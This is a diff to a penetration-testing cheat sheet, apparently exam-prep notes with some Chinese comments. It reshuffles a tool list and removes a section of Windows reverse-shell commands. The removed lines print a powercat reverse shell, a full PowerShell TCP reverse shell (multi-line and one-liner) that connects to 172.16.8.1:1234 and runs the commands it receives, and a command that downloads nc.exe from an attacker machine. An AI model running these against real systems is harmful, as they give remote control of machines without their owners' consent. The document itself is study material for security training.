@@ -18,14 +18,16 @@
 
 burpsuite, dirsearch, gobuster
 
-seclists, Nessus，dvwa
-powercat, mingw-w64, x86_64-linux-gnu-gcc, rsg
+seclists
+mingw-w64, x86_64-linux-gnu-gcc,
 
 #### Vulnerability Analysis
 
-##### wpscan
+Nessus，wpscan
 
-wp.php
+#### reverse shell
+
+rsg
 
 ### General Tools
 
@@ -188,41 +190,3 @@ sc start wsearch
 - PsInfo64.exe /accepteula
 
 ---
-
-## Tools (reverse shell)
-
-### powercat
-
-```shell
-powercat -c 172.16.8.1 -p 1234 -e cmd.exe
-```
-
-### powershell
-
-reverse shell
-
-```powershell
-# 被控端
-$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-{
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-  $sendback = (iex $data 2>&1 | Out-String );
-  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-  $stream.Write($sendbyte,0,$sendbyte.Length);
-  $stream.Flush();
-}
-$client.Close();
-
-# 单行行式的代码
-C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-```
-
-download file
-
-```powershell
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kali/binaries/nc.exe','c:\windows\temp\nc.exe')"
-```
